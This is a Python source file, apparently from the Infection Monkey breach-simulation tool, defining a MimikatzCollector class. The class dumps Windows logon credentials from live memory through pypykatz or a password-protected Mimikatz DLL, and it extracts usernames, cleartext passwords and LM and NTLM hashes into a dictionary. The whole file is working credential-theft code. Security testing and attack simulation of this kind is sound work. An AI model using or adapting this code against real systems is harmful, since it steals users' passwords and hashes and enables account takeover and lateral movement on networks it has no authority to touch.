import binascii
import ctypes
import logging
import socket
import zipfile
import json

import infection_monkey.config
from common.utils.attack_utils import ScanStatus, UsageEnum
from infection_monkey.telemetry.attack.t1129_telem import T1129Telem
from infection_monkey.telemetry.attack.t1106_telem import T1106Telem
from infection_monkey.pyinstaller_utils import get_binary_file_path, get_binaries_dir_path

__author__ = 'itay.mizeretz'

LOG = logging.getLogger(__name__)


class MimikatzCollector(object):
    """
    Password collection module for Windows using Mimikatz.
    """

    # Name of Mimikatz DLL. Must be name of file in Mimikatz zip.
    MIMIKATZ_DLL_NAME = 'tmpzipfile123456.dll'

    # Name of ZIP containing Mimikatz. Must be identical to one on monkey.spec
    MIMIKATZ_ZIP_NAME = 'tmpzipfile123456.zip'

    # Password to Mimikatz zip file
    MIMIKATZ_ZIP_PASSWORD = b'VTQpsJPXgZuXhX6x3V84G'

    def __init__(self, mode='pypykatz'):
        self._config = infection_monkey.config.WormConfiguration
        self._isInit = False
        self._dll = None
        self._collect = None
        self._get = None
        self._mode = mode if mode == 'pypykatz' else 'dll'
        self.init_mimikatz()

    def init_mimikatz(self):
        try:
            if self._mode == 'pypykatz':
                self._init_pypykatz()
            else:
                self._init_dll()
            self._isInit = True
            status = ScanStatus.USED
        except Exception:
            LOG.exception("Error initializing mimikatz collector")
            status = ScanStatus.SCANNED
        T1106Telem(status, UsageEnum.MIMIKATZ_WINAPI).send()
        T1129Telem(status, UsageEnum.MIMIKATZ).send()

    def _init_pypykatz(self):
        from pypykatz.pypykatz import pypykatz
        mimi = pypykatz.go_live()
        results = []

        for luid in mimi.logon_sessions:
            ls = mimi.logon_sessions[luid]
            if len(ls.username) == 0:
                continue
            logon_data = self.LogonData()
            logon_data.username = ls.username

            for cred in ls.msv_creds:
                t = cred.to_dict()
                lm_hash = (ctypes.c_byte * self.LogonData.LM_NTLM_HASH_LENGTH)()
                if t['LMHash']:
                    for i in range(len(t['LMHash'])):
                        lm_hash[i] = t['LMHash'][i]
                ntlm_hash = (ctypes.c_byte * self.LogonData.LM_NTLM_HASH_LENGTH)()
                if t['NThash']:
                    for i in range(len(t['NThash'])):
                        ntlm_hash[i] = t['NThash'][i]

                logon_data.lm_hash = lm_hash
                logon_data.ntlm_hash = ntlm_hash
            
            for cred in ls.wdigest_creds + ls.ssp_creds + ls.livessp_creds \
                    + ls.kerberos_creds + ls.credman_creds + ls.tspkg_creds:
                t = cred.to_dict()
                if t['password'] is not None:
                    logon_data.password = str(t['password'])
                    break
            results.append(logon_data)

        def collect():
            return len(results)

        def get():
            if len(results) != 0:
                return results.pop()

        def get_text_output():
            output = []
            for luid in mimi.logon_sessions:
                output.append('\n'+str(mimi.logon_sessions[luid]))

            if len(mimi.orphaned_creds) > 0:
                output.append('\n== Orphaned credentials ==\n')
                for cred in mimi.orphaned_creds:
                    output.append(str(cred))
            return ''.join(output)

        self._collect = collect
        self._get = get
        self._get_text_output_proto = get_text_output

    def _init_dll(self):
        with zipfile.ZipFile(get_binary_file_path(MimikatzCollector.MIMIKATZ_ZIP_NAME), 'r') as mimikatz_zip:
            mimikatz_zip.extract(self.MIMIKATZ_DLL_NAME, path=get_binaries_dir_path(),
                                    pwd=self.MIMIKATZ_ZIP_PASSWORD)

        self._dll = ctypes.WinDLL(get_binary_file_path(self.MIMIKATZ_DLL_NAME))
        collect_proto = ctypes.WINFUNCTYPE(ctypes.c_int)
        get_proto = ctypes.WINFUNCTYPE(MimikatzCollector.LogonData)
        get_text_output_proto = ctypes.WINFUNCTYPE(ctypes.c_wchar_p)
        self._collect = collect_proto(("collect", self._dll))
        self._get = get_proto(("get", self._dll))
        self._get_text_output_proto = get_text_output_proto(("getTextOutput", self._dll))

    def get_logon_info(self):
        """
        Gets the logon info from mimikatz.
        Returns a dictionary of users with their known credentials.
        """
        LOG.info('Getting mimikatz logon information')
        if not self._isInit:
            return {}
        LOG.debug("Running mimikatz collector")

        try:
            entry_count = self._collect()

            logon_data_dictionary = {}
            hostname = socket.gethostname()

            self.mimikatz_text = self._get_text_output_proto()

            for i in range(entry_count):
                entry = self._get()
                username = entry.username

                password = entry.password
                lm_hash = binascii.hexlify(bytearray(entry.lm_hash)).decode()
                ntlm_hash = binascii.hexlify(bytearray(entry.ntlm_hash)).decode()

                if 0 == len(password):
                    has_password = False
                elif (username[-1] == '$') and (hostname.lower() == username[0:-1].lower()):
                    # Don't save the password of the host domain user (HOSTNAME$)
                    has_password = False
                else:
                    has_password = True

                has_lm = ("00000000000000000000000000000000" != lm_hash)
                has_ntlm = ("00000000000000000000000000000000" != ntlm_hash)

                if username not in logon_data_dictionary:
                    logon_data_dictionary[username] = {}
                if has_password:
                    logon_data_dictionary[username]["password"] = password
                if has_lm:
                    logon_data_dictionary[username]["lm_hash"] = lm_hash
                if has_ntlm:
                    logon_data_dictionary[username]["ntlm_hash"] = ntlm_hash

            return logon_data_dictionary
        except Exception:
            LOG.exception("Error getting logon info")
            return {}

    def get_mimikatz_text(self):
        return self.mimikatz_text

    class LogonData(ctypes.Structure):
        """
        Logon data structure returned from mimikatz.
        """

        WINDOWS_MAX_USERNAME_PASS_LENGTH = 257
        LM_NTLM_HASH_LENGTH = 16

        _fields_ = \
            [
                ("username", ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
                ("password", ctypes.c_wchar * WINDOWS_MAX_USERNAME_PASS_LENGTH),
                ("lm_hash", ctypes.c_byte * LM_NTLM_HASH_LENGTH),
                ("ntlm_hash", ctypes.c_byte * LM_NTLM_HASH_LENGTH)
            ]
